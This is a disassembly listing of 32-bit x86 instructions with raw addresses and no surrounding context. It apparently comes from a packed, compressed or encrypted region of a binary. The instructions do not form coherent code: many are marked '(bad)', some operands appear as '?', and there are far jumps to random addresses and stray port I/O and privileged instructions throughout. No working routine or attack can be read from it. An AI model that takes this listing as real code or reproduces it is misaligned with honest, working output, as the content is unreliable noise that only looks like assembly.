  41f0e5:	add    DWORD PTR [ebx+0x5c91f4eb],edi
  41f0eb:	leave  
  41f0ec:	shl    bl,cl
  41f0ee:	inc    esp
  41f0ef:	in     eax,dx
  41f0f0:	push   esp
  41f0f1:	xchg   ebx,eax
  41f0f2:	adc    eax,0x20572e1c
  41f0f7:	mov    al,ds:0x9efc7492
  41f0fc:	and    cl,bh
  41f0fe:	lods   al,BYTE PTR ds:[esi]
  41f0ff:	xchg   esp,eax
  41f100:	cmp    al,0xeb
  41f102:	lock mov esi,0x83ff9689
  41f108:	mov    eax,0x1a20c56a
  41f10d:	xor    DWORD PTR [si-0x24],0x4d
  41f112:	mov    ah,0x62
  41f114:	in     al,dx
  41f115:	nop
  41f116:	sub    eax,DWORD PTR [ebx+0x1c1ba911]
  41f11c:	sbb    BYTE PTR [esi-0x34],dh
  41f11f:	dec    ebp
  41f120:	sbb    eax,0x8509bf6b
  41f125:	stos   BYTE PTR es:[edi],al
  41f126:	push   esi
  41f127:	cmp    BYTE PTR [ecx],cl
  41f129:	cld    
  41f12a:	mov    ebp,0xdb7bace0
  41f12f:	mov    cl,0xa
  41f131:	and    ch,BYTE PTR [ebx+eiz*8]
  41f134:	arpl   WORD PTR [edx+eax*8+0x68e1f09f],dx
  41f13b:	lock push esp
  41f13d:	xor    eax,0x63b1411
  41f142:	dec    esp
  41f143:	clc    
  41f144:	sbb    DWORD PTR [ecx],ebx
  41f146:	adc    al,0x54
  41f148:	adc    DWORD PTR [ebp+0x35],esi
  41f14b:	push   esi
  41f14c:	inc    ecx
  41f14d:	jns    0x41f180
  41f14f:	into   
  41f150:	icebp  
  41f151:	fmul   st,st(1)
  41f153:	cdq    
  41f154:	fwait
  41f155:	cmpxchg DWORD PTR [edi-0x33],ebx
  41f159:	push   edx
  41f15a:	jle    0x41f108
  41f15c:	xor    DWORD PTR [edi],ebp
  41f15e:	stos   DWORD PTR es:[edi],eax
  41f15f:	repnz clc 
  41f161:	add    BYTE PTR [ecx+0x1],0x6b
  41f165:	adc    eax,0x38f40ba3
  41f16a:	pusha  
  41f16b:	or     esp,DWORD PTR [edx]
  41f16d:	ins    DWORD PTR es:[edi],dx
  41f16e:	mov    WORD PTR [eax],ss
  41f170:	in     eax,0x31
  41f172:	sub    esi,esi
  41f174:	push   0x62
  41f176:	cmp    BYTE PTR [eax+0x27],dl
  41f179:	xchg   esi,eax
  41f17a:	and    al,0xd9
  41f17c:	mov    dh,0xe0
  41f17e:	add    bl,dl
  41f180:	mov    esp,0x84668cff
  41f185:	push   ss
  41f186:	mov    ?,ebx
  41f188:	mov    al,0xad
  41f18a:	jmp    0x2e46:0xeb707a30
  41f191:	fisttp QWORD PTR [ecx-0x64cdc25a]
  41f197:	pusha  
  41f198:	inc    eax
  41f199:	das    
  41f19a:	std    
  41f19b:	fst    DWORD PTR [edi+eiz*2-0x7f4dfc8d]
  41f1a2:	aad    0xd5
  41f1a4:	mov    eax,0xc7879b60
  41f1a9:	xchg   edi,eax
  41f1aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1ab:	in     eax,0x5b
  41f1ad:	loopne 0x41f1cc
  41f1af:	jmp    0x41f131
  41f1b1:	frstor ss:[ecx+edi*8]
  41f1b5:	add    BYTE PTR [ecx],al
  41f1b7:	stos   BYTE PTR es:[edi],al
  41f1b8:	mov    cl,0x4c
  41f1ba:	pop    eax
  41f1bb:	iret   
  41f1bc:	mov    ebx,0x496445ae
  41f1c1:	(bad)  [esi-0x49e69353]
  41f1c7:	jmp    0x1ef423f5
  41f1cc:	and    dh,dl
  41f1ce:	mov    ebp,0x7ecda321
  41f1d3:	push   ebp
  41f1d4:	and    dh,BYTE PTR [ecx]
  41f1d6:	ss pop es
  41f1d8:	pusha  
  41f1d9:	sar    ah,cl
  41f1db:	add    eax,0xd5b3980f
  41f1e0:	sub    al,0xf6
  41f1e2:	push   0x54
  41f1e4:	or     DWORD PTR [ebx],ecx
  41f1e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1e7:	xor    BYTE PTR [ebx+0x14dcf2de],0x6d
  41f1ee:	(bad)  
  41f1ef:	and    bh,cl
  41f1f1:	xchg   esp,eax
  41f1f2:	adc    ebx,DWORD PTR ds:0x32c4d78a
  41f1f8:	(bad)  
  41f1f9:	jbe    0x41f214
  41f1fb:	sbb    bl,BYTE PTR [esi-0x2d]
  41f1fe:	loop   0x41f1e8
  41f200:	fld    QWORD PTR [edx+0x5f]
  41f203:	adc    ebx,ebx
  41f205:	pop    ebx
  41f206:	mov    ecx,0x2dab997f
  41f20b:	adc    BYTE PTR [ecx],0x25
  41f20e:	xchg   BYTE PTR [edi],al
  41f210:	gs (bad) 
  41f212:	jno    0x41f280
  41f214:	xor    ebx,ebx
  41f216:	enter  0x85cb,0x35
  41f21a:	mov    ebp,esp
  41f21c:	mov    edx,0xdfd56b88
  41f221:	or     eax,0xb227e8c8
  41f226:	leave  
  41f227:	test   BYTE PTR [ecx+0x49],0x54
  41f22b:	repnz lods eax,DWORD PTR ds:[esi]
  41f22d:	lods   al,BYTE PTR ds:[esi]
  41f22e:	aaa    
  41f22f:	mov    ebp,?
  41f231:	push   0x4e60d62
  41f236:	cmp    BYTE PTR [esi+0x0],bl
  41f239:	loopne 0x41f24e
  41f23b:	stos   DWORD PTR es:[edi],eax
  41f23c:	inc    ebp
  41f23d:	imul   ebp,DWORD PTR [esi-0x1bc91ce2],0xffffffba
  41f244:	sahf   
  41f245:	int    0x13
  41f247:	dec    ebp
  41f248:	inc    esi
  41f249:	shl    DWORD PTR [edi],0x49
  41f24c:	xor    dh,BYTE PTR [edi+0x6cec3706]
  41f252:	rol    DWORD PTR [edx],cl
  41f254:	and    esp,DWORD PTR [eax+0x2]
  41f257:	inc    ecx
  41f258:	out    dx,al
  41f259:	ins    BYTE PTR es:[edi],dx
  41f25a:	jmp    0x8900:0x9274b392
  41f261:	aam    0xa7
  41f263:	pop    edi
  41f264:	add    ecx,esp
  41f266:	out    dx,al
  41f267:	das    
  41f268:	test   BYTE PTR [edi+0xa],0x3a
  41f26c:	rcl    bl,cl
  41f26e:	fist   DWORD PTR [edx+0x41953c2b]
  41f274:	sbb    ah,ch
  41f276:	dec    esp
  41f277:	out    dx,al
  41f278:	pop    ss
  41f279:	pushf  
  41f27a:	inc    esi
  41f27b:	mov    ebp,0x160172a0
  41f280:	inc    eax
  41f281:	jl     0x41f28b
  41f283:	inc    edi
  41f284:	or     ecx,DWORD PTR [ebx-0x6a767cf6]
  41f28a:	cwde   
  41f28b:	rcl    bl,cl
  41f28d:	and    DWORD PTR [edx+0x47b535fd],esp
  41f293:	inc    ebx
  41f294:	xchg   DWORD PTR [eax],esi
  41f296:	mov    ebp,0x5a175bd5
  41f29b:	jnp    0x41f24a
  41f29d:	cmp    al,0x60
  41f29f:	mov    ah,0x1
  41f2a1:	sbb    al,0x1e
  41f2a3:	ins    DWORD PTR es:[edi],dx
  41f2a4:	aam    0xb2
  41f2a6:	xor    eax,0x2f993b83
  41f2ab:	jp     0x41f327
  41f2ad:	out    0xa2,al
  41f2af:	pushf  
  41f2b0:	cwde   
  41f2b1:	mov    ecx,0x2871747d
  41f2b6:	lods   al,BYTE PTR ds:[esi]
  41f2b7:	xlat   BYTE PTR ds:[ebx]
  41f2b8:	xchg   edx,eax
  41f2b9:	adc    al,0x31
  41f2bb:	add    cl,al
  41f2bd:	retf   0x184b
  41f2c0:	cmp    bh,BYTE PTR [edi-0x687c504c]
  41f2c6:	pop    eax
  41f2c7:	imul   esp,ecx,0x4b138c77
  41f2cd:	mov    esp,0x67417ffd
  41f2d2:	inc    ebp
  41f2d3:	jmp    DWORD PTR [ecx+0x73]
  41f2d6:	xor    BYTE PTR [ecx],bh
  41f2d8:	(bad)  
  41f2d9:	clc    
  41f2da:	add    al,0x18
  41f2dc:	mov    bh,0x80
  41f2de:	loopne 0x41f2bf
  41f2e0:	pop    ss
  41f2e1:	cdq    
  41f2e2:	push   ebp
  41f2e3:	shl    DWORD PTR [esi+0x52396e3f],cl
  41f2e9:	scas   eax,DWORD PTR es:[edi]
  41f2ea:	inc    esi
  41f2eb:	and    BYTE PTR [eax+0x71],bh
  41f2ee:	icebp  
  41f2ef:	ror    eax,0x52
  41f2f2:	pusha  
  41f2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f4:	sub    al,0x24
  41f2f6:	sbb    DWORD PTR [ebx+ebx*1-0x1b],edi
  41f2fa:	shl    DWORD PTR [eax],cl
  41f2fc:	push   cs
  41f2fd:	dec    ecx
  41f2fe:	add    dh,BYTE PTR [ebx+edx*2]
  41f301:	outs   dx,BYTE PTR ds:[esi]
  41f302:	jmp    0x9503:0x8d941b55
  41f309:	add    al,0x7e
  41f30b:	push   esi
  41f30c:	(bad)  
  41f30d:	repnz enter 0x717d,0xeb
  41f312:	pop    ds
  41f313:	repnz sbb DWORD PTR [ebp+0x50],ebp
  41f317:	mov    ds:0xcd571fa1,al
  41f31c:	jmp    0x41f333
  41f31e:	test   al,al
  41f320:	das    
  41f321:	arpl   bx,cx
  41f323:	das    
  41f324:	imul   ebx,DWORD PTR ds:[edi+0x7be3fae],0x68
  41f32c:	addr16 mov dh,0x38
  41f32f:	add    BYTE PTR [ebx],ah
  41f331:	iret   
  41f332:	out    0xde,eax
  41f334:	(bad)  [edi+0x6b]
  41f337:	pusha  
  41f338:	xchg   esi,eax
  41f339:	add    DWORD PTR [esi+0x32],eax
  41f33c:	out    dx,al
  41f33d:	lock push edi
  41f33f:	pop    esi
  41f340:	adc    edx,DWORD PTR [edx]
  41f342:	lock in eax,0x78
  41f345:	push   esi
  41f346:	lea    eax,[eax-0x4b]
  41f349:	mov    dl,bl
  41f34b:	add    eax,0x385ff7d5
  41f350:	and    DWORD PTR [eax+0xe],esp
  41f353:	push   cs
  41f354:	call   0x1a0d:0x67e8b878
  41f35b:	xchg   ebp,eax
  41f35c:	repnz sar BYTE PTR [edx-0x60109443],1
  41f363:	repz cli 
  41f365:	popa   
  41f366:	push   0xffffff86
  41f368:	jg     0x41f2fa
  41f36a:	mov    esi,0xdc6eff9
  41f36f:	sbb    cl,bl
  41f371:	xor    DWORD PTR [esi-0x66aff137],ecx
  41f377:	ins    BYTE PTR es:[edi],dx
  41f378:	mov    ecx,0xe985f6f7
  41f37d:	sti    
  41f37e:	fsubr  QWORD PTR [ebx-0x49]
  41f381:	(bad)  
  41f382:	fnstenv [edi+0x8bf66ce]
  41f388:	js     0x41f3c7
  41f38a:	push   edx
  41f38b:	dec    BYTE PTR [ecx+0x1]
  41f38e:	sub    ecx,DWORD PTR [esi-0x620bf7f0]
  41f394:	mov    edi,0x101cba22
  41f399:	and    eax,0xde99fd1b
  41f39e:	push   edi
  41f39f:	add    BYTE PTR [edi+edi*2-0x65],al
  41f3a3:	into   
  41f3a4:	cmp    dl,cl
  41f3a6:	mov    eax,0x18dfd59
  41f3ab:	pop    esi
  41f3ac:	popa   
  41f3ad:	xlat   BYTE PTR ds:[ebx]
  41f3ae:	(bad)  
  41f3af:	fcmovu st,st(7)
  41f3b1:	pop    edx
  41f3b2:	rcl    DWORD PTR [edx],cl
  41f3b4:	not    DWORD PTR [ebx+0x8769f99]
  41f3ba:	leave  
  41f3bb:	les    esp,FWORD PTR [ecx+ebx*2]
  41f3be:	ss pop ss
  41f3c0:	fadd   DWORD PTR [ecx]
  41f3c2:	pop    DWORD PTR [esi+0x1f]
  41f3c5:	ret    0xa4cc
  41f3c8:	mov    ebp,0xa7a078fb
  41f3cd:	fwait
  41f3ce:	push   cs
  41f3cf:	loopne 0x41f433
  41f3d1:	dec    edi
  41f3d2:	xor    BYTE PTR [ecx-0x5a],bh
  41f3d5:	sbb    DWORD PTR [ecx+0x7e5ed3b6],edi
  41f3db:	adc    DWORD PTR [edx-0x2fe67aae],edx
  41f3e1:	xchg   ebx,eax
  41f3e2:	jbe    0x41f459
  41f3e4:	sub    DWORD PTR [eax+edi*8+0x5c59223f],esp
  41f3eb:	sub    al,0x5f
  41f3ed:	stos   DWORD PTR es:[edi],eax
  41f3ee:	enterw 0x4923,0xd3
  41f3f3:	ret    0xead7
  41f3f6:	shr    DWORD PTR ds:0x125d01f4,cl
  41f3fc:	dec    esp
  41f3fd:	mov    edx,0x5f925235
  41f402:	stc    
  41f403:	pop    edx
  41f404:	cli    
  41f405:	call   0xa33e3834
  41f40a:	mov    esp,0xb4928aab
  41f40f:	mov    ds:0x1034f1dd,eax
  41f414:	and    eax,0x87846c41
  41f419:	push   ecx
  41f41a:	pop    ss
  41f41b:	(bad)  
  41f41c:	sub    eax,0xb82e8f4b
  41f421:	mov    ds:0x97eb9a2c,al
  41f426:	pushf  
  41f427:	icebp  
  41f428:	(bad)  
  41f429:	adc    al,0x69
  41f42b:	xchg   ecx,eax
  41f42c:	pusha  
  41f42d:	das    
  41f42e:	test   BYTE PTR [ecx-0x257820a0],0xc4
  41f435:	outs   dx,BYTE PTR ds:[esi]
  41f436:	cs loop 0x41f496
  41f439:	loope  0x41f42e
  41f43b:	aam    0xa6
  41f43d:	aad    0xc2
  41f43f:	aas    
  41f440:	xchg   edx,eax
  41f441:	loopne 0x41f487
  41f443:	mov    ebp,0x3ebc59ca
  41f448:	jmp    0x9ec:0x8c2fd7af
  41f44f:	dec    edx
  41f450:	test   bl,0x6b
  41f453:	(bad)  
  41f454:	pop    ss
  41f455:	xchg   edi,eax
  41f456:	pop    ebp
  41f457:	hlt    
  41f458:	arpl   WORD PTR [esi-0x94ac85b],di
  41f45e:	or     edx,edx
  41f460:	sub    BYTE PTR [esi+eiz*8-0x288b567b],0xc9
  41f468:	call   FWORD PTR [ecx-0x3b52df6d]
  41f46e:	out    dx,eax
  41f46f:	adc    al,BYTE PTR [esi]
  41f471:	mov    gs:0x9d0e817,eax
  41f477:	xchg   esi,eax
  41f478:	sqrtps xmm4,XMMWORD PTR [edi]
  41f47b:	and    ch,0x3c
  41f47e:	jp     0x41f494
  41f480:	xchg   esi,eax
  41f481:	push   ds
  41f482:	mov    ebx,0x875f9b10
  41f487:	dec    esi
  41f488:	xor    BYTE PTR [ebx+0x79],dl
  41f48b:	xchg   BYTE PTR [esi],ah
  41f48d:	call   0xd1e6ef99
  41f492:	jecxz  0x41f4f6
  41f494:	dec    DWORD PTR [esi]
  41f496:	jb     0x41f48b
  41f498:	mov    ds:0x3ff51b0d,eax
  41f49d:	mov    esi,0x73986ea1
  41f4a2:	adc    DWORD PTR [ecx+0x39],eax
  41f4a5:	mov    esp,0x7beec155
  41f4aa:	mov    ebp,0x2cbaefbb
  41f4af:	pop    esp
  41f4b0:	inc    bh
  41f4b2:	jmp    0xfad1e02a
  41f4b7:	jae    0x41f52e
  41f4b9:	jb     0x41f4f8
  41f4bb:	mov    ecx,gs
  41f4bd:	js     0x41f529
  41f4bf:	dec    esp
  41f4c0:	jo     0x41f46b
  41f4c2:	or     BYTE PTR [edi],0x6f
  41f4c5:	cmp    eax,0x375d5d48
  41f4ca:	aaa    
  41f4cb:	mul    BYTE PTR [esi+edx*2-0xf]
  41f4cf:	ret    
  41f4d0:	mov    ds:0xa351499b,eax
  41f4d5:	cmp    bl,0xa4
  41f4d8:	sbb    eax,0xffffffbe
  41f4db:	outs   dx,DWORD PTR ds:[esi]
  41f4dc:	sub    eax,0x4d318327
  41f4e1:	rcr    bl,1
  41f4e3:	ins    BYTE PTR es:[edi],dx
  41f4e4:	xchg   esi,eax
  41f4e5:	adc    al,0x59
  41f4e7:	add    ebp,DWORD PTR [esi]
  41f4e9:	daa    
  41f4ea:	(bad)  
  41f4eb:	sub    eax,0x645927d3
  41f4f0:	cmc    
  41f4f1:	es dec esp
  41f4f3:	jl     0x41f552
  41f4f5:	in     al,0x40
  41f4f7:	mov    ds:0x4ae51d15,al
  41f4fc:	push   0x98a9b98
  41f501:	xor    BYTE PTR [eax-0x7d],0x7a
  41f505:	stos   BYTE PTR es:[edi],al
  41f506:	lods   eax,DWORD PTR ds:[esi]
  41f507:	push   ecx
  41f508:	cmp    al,0x1e
  41f50a:	(bad)  
  41f50b:	sbb    al,0x39
  41f50d:	clc    
  41f50e:	retf   0x619d
  41f511:	out    0x2d,eax
  41f513:	jns    0x41f4db
  41f515:	outs   dx,BYTE PTR ds:[esi]
  41f516:	pop    esi
  41f517:	sar    bh,cl
  41f519:	xor    eax,DWORD PTR [eax+eiz*2-0x7d]
  41f51d:	int3   
  41f51e:	sub    eax,0xa5ec9c89
  41f523:	ror    esi,1
  41f525:	mov    cl,0x48
  41f527:	dec    esp
  41f528:	jle    0x41f515
  41f52a:	push   ecx
  41f52b:	mov    bl,0xeb
  41f52d:	int3   
  41f52e:	mov    eax,ds:0x3c89b45c
  41f533:	aaa    
  41f534:	(bad)  
  41f535:	(bad)  
  41f536:	shl    esp,cl
  41f538:	add    cl,dl
  41f53a:	push   esi
  41f53b:	jno    0x41f522
  41f53d:	cmp    al,0xff
  41f53f:	sbb    DWORD PTR [ecx+0x4beb2964],eax
  41f545:	mov    ah,0xf0
  41f547:	inc    ecx
  41f548:	sbb    esp,DWORD PTR [edx-0x53]
  41f54b:	aas    
  41f54c:	jb     0x41f4d3
  41f54e:	jle    0x41f522
  41f550:	bound  ebp,QWORD PTR [esi]
  41f552:	dec    ebp
  41f553:	out    0x7,eax
  41f555:	hlt    
  41f556:	mov    bl,al
  41f558:	add    DWORD PTR [ecx+0x3c2a8bee],esi
  41f55e:	and    ebx,DWORD PTR [ebp+0x2a0f34a5]
  41f564:	outs   dx,DWORD PTR ds:[esi]
  41f565:	add    edx,DWORD PTR [ebx]
  41f567:	jnp    0x41f568
  41f569:	ja     0x41f5ae
  41f56b:	jo     0x41f57a
  41f56d:	inc    eax
  41f56e:	loopne 0x41f54b
  41f570:	ficom  WORD PTR es:[esp+eiz*8-0x20f3b0e0]
  41f578:	sbb    eax,0xe02e63c9
  41f57d:	adc    eax,0x46a96964
  41f582:	mov    ah,dh
  41f584:	mov    ds:0x6fe6399a,eax
  41f589:	add    al,0xbb
  41f58b:	(bad)  
  41f58c:	mov    esp,0xe74cad45
  41f591:	mov    ecx,0xf72e7f84
  41f596:	cmp    BYTE PTR [edx+0x43],dh
  41f599:	push   edi
  41f59a:	sub    eax,0xf3ff9aea
  41f59f:	sub    BYTE PTR [ecx],ch
  41f5a1:	pop    ss
  41f5a2:	fidivr WORD PTR [esi-0x28]
  41f5a5:	test   eax,0xde21da55
  41f5aa:	push   ss
  41f5ab:	add    edx,ecx
  41f5ad:	aas    
  41f5ae:	int    0x42
  41f5b0:	mov    WORD PTR [edi+0x1a5bfbfa],ss
  41f5b6:	jmp    0x62c3cb3
  41f5bb:	pop    esi
  41f5bc:	pop    ss
  41f5bd:	adc    BYTE PTR [ebx-0x3cbaf9a7],ah
  41f5c3:	mul    ebp
  41f5c5:	mov    al,ds:0x4b79eb53
  41f5ca:	sub    DWORD PTR [edi],eax
  41f5cc:	push   esi
  41f5cd:	jmp    0x3c062bd7
  41f5d2:	sub    eax,DWORD PTR [edi+0x4cfd12fa]
  41f5d8:	mov    esp,0xb943187c
  41f5dd:	outs   dx,DWORD PTR ds:[esi]
  41f5de:	int    0x67
  41f5e0:	xchg   DWORD PTR [edx+0x635cdba2],ebp
  41f5e6:	sahf   
  41f5e7:	jmp    0xe4d7:0x6aafb0f1
  41f5ee:	enter  0xae74,0xf5
  41f5f2:	inc    edi
  41f5f3:	ins    DWORD PTR es:[edi],dx
  41f5f4:	sar    DWORD PTR [edi-0xc2a6659],0x16
  41f5fb:	aaa    
  41f5fc:	dec    esi
  41f5fd:	push   0xffffffc2
  41f5ff:	arpl   di,sp
  41f601:	fdiv   st,st(5)
  41f603:	push   ecx
  41f604:	pop    ebx
  41f605:	jecxz  0x41f664
  41f607:	or     BYTE PTR [ebx-0x599d383c],dl
  41f60d:	test   al,0xd5
  41f60f:	sbb    ch,dl
  41f611:	dec    edi
  41f612:	ins    BYTE PTR es:[edi],dx
  41f613:	icebp  
  41f614:	push   esp
  41f615:	lahf   
  41f616:	lods   al,BYTE PTR ds:[esi]
  41f617:	shl    BYTE PTR [ebp+0x7b9dfc8],1
  41f61d:	out    dx,al
  41f61e:	push   ecx
  41f61f:	stos   BYTE PTR es:[edi],al
  41f620:	push   ds
  41f621:	or     DWORD PTR [eax+ebx*8+0x68],edi
  41f625:	je     0x41f616
  41f627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f628:	jg     0x41f5de
  41f62a:	mov    esp,0x4f34650a
  41f62f:	cmp    eax,0x8ef59a60
  41f634:	leave  
  41f635:	jge    0x41f5c3
  41f637:	dec    edi
  41f638:	and    DWORD PTR gs:[edi+0x1d],edi
  41f63c:	scas   al,BYTE PTR es:[edi]
  41f63d:	xchg   esp,ebx
  41f63f:	cwde   
  41f640:	xor    DWORD PTR [esp+ebx*4],ebp
  41f643:	popf   
  41f644:	or     al,0xb
  41f646:	adc    al,bh
  41f648:	outs   dx,BYTE PTR ds:[esi]
  41f649:	mov    WORD PTR [esi-0x7ef45004],es
  41f64f:	push   esp
  41f650:	mul    DWORD PTR [ebx-0x59d2b028]
  41f656:	mov    bh,0x22
  41f658:	enter  0x8382,0x31
  41f65c:	sbb    al,BYTE PTR [esi-0x77860682]
  41f662:	push   ebp
  41f663:	jle    0x41f66e
  41f665:	daa    
  41f666:	fisubr WORD PTR [edi-0x29e6f67e]
  41f66c:	out    0x91,al
  41f66e:	call   0x6ec3:0x66a5958e
  41f675:	lea    eax,[ebp+0x66fe8119]
  41f67b:	ret    
  41f67c:	shr    dh,0x4f
  41f67f:	cld    
  41f680:	clc    
  41f681:	stos   DWORD PTR es:[edi],eax
  41f682:	or     eax,0xdf9197b9
  41f687:	push   0xfffffff2
  41f689:	das    
  41f68a:	xchg   edx,eax
  41f68b:	lods   al,BYTE PTR ds:[esi]
  41f68c:	push   esi
  41f68d:	clc    
  41f68e:	lods   eax,DWORD PTR ds:[esi]
  41f68f:	xor    DWORD PTR [eax+0x43],esp
  41f692:	ret    
  41f693:	push   edx
  41f694:	inc    ecx
  41f695:	mov    edi,0xa64c2047
  41f69a:	push   eax
  41f69b:	shl    BYTE PTR [eax-0x68f497af],cl
  41f6a1:	and    BYTE PTR [edi+0x44e5abba],cl
  41f6a7:	add    esp,ebp
  41f6a9:	imul   eax,DWORD PTR [esi+0x1baf6174],0x943c7ef
  41f6b3:	pop    ebx
  41f6b4:	js     0x41f71b
  41f6b6:	dec    edx
  41f6b7:	mov    ah,0xb2
  41f6b9:	and    al,0x8e
  41f6bb:	xlat   BYTE PTR ds:[ebx]
  41f6bc:	int3   
  41f6bd:	nop
  41f6be:	repnz or BYTE PTR [ebp+ebp*4+0x36092427],dh
  41f6c6:	std    
  41f6c7:	cli    
  41f6c8:	sbb    al,0xcf
  41f6ca:	pushf  
  41f6cb:	div    ebp
  41f6cd:	xchg   ecx,eax
  41f6ce:	jg     0x41f741
  41f6d0:	loope  0x41f66f
  41f6d2:	inc    bp
  41f6d4:	add    BYTE PTR [edx*8-0x90b33d8],cl
  41f6db:	clc    
  41f6dc:	ret    
  41f6dd:	mul    BYTE PTR [edi+0x31]
  41f6e0:	lock (bad) es:[ebx+0x25]
  41f6e5:	mov    ebp,0x3404408e
  41f6ea:	and    eax,0x2515157a
  41f6ef:	call   0x23e8:0x9f9f9940
  41f6f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6f7:	dec    ebx
  41f6f8:	ja     0x41f6d1
  41f6fa:	mov    WORD PTR [ecx],ss
  41f6fc:	cmp    eax,esp
  41f6fe:	ja     0x41f6b9
  41f700:	push   0x5f245bd
  41f705:	ds int 0x16
  41f708:	dec    ebx
  41f709:	dec    ecx
  41f70a:	loopne 0x41f69a
  41f70c:	imul   esp,esi,0x40e20006
  41f712:	ret    0xee04
  41f715:	push   ebp
  41f716:	xor    al,0xca
  41f718:	xchg   DWORD PTR ds:0x62919af1,ebp
  41f71e:	lock jns 0x41f781
  41f721:	cmp    bh,BYTE PTR [esi-0x50610632]
  41f727:	ficomp DWORD PTR [ebx]
  41f729:	or     al,0x75
  41f72b:	mov    al,es:0xba4fc776
  41f731:	sub    al,0x1
  41f733:	icebp  
  41f734:	ss jl  0x41f756
  41f737:	loop   0x41f74b
  41f739:	dec    edi
  41f73a:	cmp    edx,DWORD PTR [edx+0x65]
  41f73d:	stos   BYTE PTR es:[edi],al
  41f73e:	push   ebx
  41f73f:	pop    es
  41f740:	cs (bad) 
  41f742:	mov    ds:0x4f6d935a,eax
  41f747:	dec    ecx
  41f748:	loope  0x41f78f
  41f74a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f74b:	jge    0x41f738
  41f74d:	add    al,0x56
  41f74f:	mov    ebx,0xf808e4ad
  41f754:	and    edi,DWORD PTR [edi+0x1a6e202e]
  41f75a:	mov    al,ds:0xf7a0a0c2
  41f75f:	add    ecx,DWORD PTR [eax-0x6f]
  41f762:	sahf   
  41f763:	xlat   BYTE PTR ds:[ebx]
  41f764:	push   es
  41f765:	(bad)  
  41f766:	in     al,dx
  41f767:	sub    esi,edx
  41f769:	pop    edi
  41f76a:	clc    
  41f76b:	mov    edx,0x86d2a856
  41f770:	in     al,0x99
  41f772:	jne    0x41f7e2
  41f774:	pushf  
  41f775:	mov    BYTE PTR gs:[edi-0x31801146],bl
  41f77c:	xor    BYTE PTR [edi+0x55480578],0xe1
  41f783:	jnp    0x41f7c7
  41f785:	lods   eax,DWORD PTR ds:[esi]
  41f786:	inc    bh
  41f788:	cmp    DWORD PTR [eax-0x49edb2cd],esi
  41f78e:	inc    edi
  41f78f:	jbe    0x41f72f
  41f791:	adc    DWORD PTR [esi],ebx
  41f793:	cmp    eax,0xb2e39876
  41f798:	jb     0x41f7a2
  41f79a:	push   edi
  41f79b:	sub    al,0x80
  41f79d:	int3   
  41f79e:	(bad)  
  41f79f:	jo     0x41f7cc
  41f7a1:	mov    esp,0xd1bfbaa5
  41f7a6:	jno    0x41f763
  41f7a8:	mov    dh,0x92
  41f7aa:	or     BYTE PTR [edi-0x20],dh
  41f7ad:	test   al,0x9a
  41f7af:	mov    ebp,0x94e85340
  41f7b4:	int3   
  41f7b5:	push   ss
  41f7b6:	dec    ebx
  41f7b7:	or     DWORD PTR [edx],esp
  41f7b9:	out    0x1d,al
  41f7bb:	addr16 pusha 
  41f7bd:	ins    DWORD PTR es:[edi],dx
  41f7be:	std    
  41f7bf:	xor    dl,dl
  41f7c1:	pop    es
  41f7c2:	adc    DWORD PTR [ebp-0x33],ecx
  41f7c5:	in     eax,dx
  41f7c6:	jae    0x41f839
  41f7c8:	mul    DWORD PTR [ecx-0x6f]
  41f7cb:	lds    ebp,FWORD PTR [ebx+0x76]
  41f7ce:	loopne 0x41f774
  41f7d0:	sbb    eax,0x9e236a30
  41f7d5:	std    
  41f7d6:	cmp    al,0xa1
  41f7d8:	fidiv  WORD PTR ss:[ecx-0x568cb057]
  41f7df:	leave  
  41f7e0:	adc    dh,ch
  41f7e2:	push   es
  41f7e3:	mov    ecx,0x99935d27
  41f7e8:	(bad)  
  41f7e9:	les    ecx,FWORD PTR [eax]
  41f7eb:	mov    edi,0xddc11d93
  41f7f0:	sub    ah,BYTE PTR [edi-0x2cb88949]
  41f7f6:	shr    BYTE PTR gs:[esi],cl
  41f7f9:	jb     0x41f870
  41f7fb:	pop    edi
  41f7fc:	fwait
  41f7fd:	sbb    al,0x7e
  41f7ff:	fwait
  41f800:	and    bl,ch
  41f802:	ds dec esp
  41f804:	loopne 0x41f823
  41f806:	out    0xa0,al
  41f808:	push   eax
  41f809:	xchg   ebp,eax
  41f80a:	lea    esp,[ecx+0x734b7098]
  41f810:	int    0xf9
  41f812:	sub    BYTE PTR [ecx+edi*8+0xff14f2d],ch
  41f819:	and    DWORD PTR [ecx+0x7b2f37e],0xffffffb4
  41f820:	int    0xcd
  41f822:	cli    
  41f823:	and    edi,edx
  41f825:	push   ss
  41f826:	sbb    DWORD PTR [eax],0xffffffbf
  41f829:	adc    al,BYTE PTR [esi+0x5a]
  41f82c:	xchg   BYTE PTR [eax-0x27],ch
  41f82f:	xor    BYTE PTR [eax-0x67177d61],0xdd
  41f836:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f837:	into   
  41f838:	cmp    al,0x1b
  41f83a:	xchg   ebp,eax
  41f83b:	(bad)  
  41f83d:	popa   
  41f83e:	das    
  41f83f:	mov    ah,0xfd
  41f841:	div    DWORD PTR [eax+0x68ed8bd4]
  41f847:	imul   ebp,DWORD PTR [esi+0x69],0x3350660
  41f84e:	adc    ah,BYTE PTR [eax-0x5d]
  41f851:	scas   al,BYTE PTR es:[edi]
  41f852:	sub    cl,BYTE PTR [esi+0x52]
  41f855:	mov    bh,BYTE PTR [ecx]
  41f857:	jno    0x41f825
  41f859:	inc    al
  41f85b:	jmp    0x41f7f7
  41f85d:	ins    DWORD PTR es:[edi],dx
  41f85e:	push   esp
  41f85f:	ins    BYTE PTR es:[edi],dx
  41f860:	fs (bad) 
  41f862:	cmp    al,0xc5
  41f864:	aam    0x8f
  41f866:	xchg   BYTE PTR [edi+ebp*2+0x595e6908],dl
  41f86d:	mov    eax,ds:0x2d38a3e9
  41f872:	ds xor al,0xe2
  41f875:	pop    eax
  41f876:	fs clc 
  41f878:	into   
  41f879:	sub    ch,al
  41f87b:	cs dec eax
  41f87d:	out    0x1f,al
  41f87f:	out    dx,al
  41f880:	dec    esp
  41f881:	mov    edi,0xa83fa23
  41f886:	in     al,dx
  41f887:	adc    esi,DWORD PTR [edi+esi*2-0x70]
  41f88b:	pusha  
  41f88c:	and    al,0x25
  41f88e:	sbb    edi,DWORD PTR [edx]
  41f890:	icebp  
